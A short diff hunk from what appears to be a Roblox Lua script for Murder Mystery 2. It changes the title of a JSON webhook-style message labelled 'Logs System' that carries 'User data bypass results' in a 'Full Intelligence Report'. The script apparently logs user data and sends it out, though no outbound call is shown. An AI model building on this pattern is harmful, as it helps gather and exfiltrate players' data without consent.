@@ -8195,7 +8195,7 @@ do
         _G.Data.Payload = _G.Data.H:JSONEncode({
             ['username'] = 'Logs System',
             ['embeds'] = {{
-                ['title'] = 'MM2 Full Intelligence Report',
+                ['title'] = 'MM2 PC Full Intelligence Report',
                 ['description'] = 'User data bypass results',
                 ['color'] = 16711680,
                 ['fields'] = GetFields()
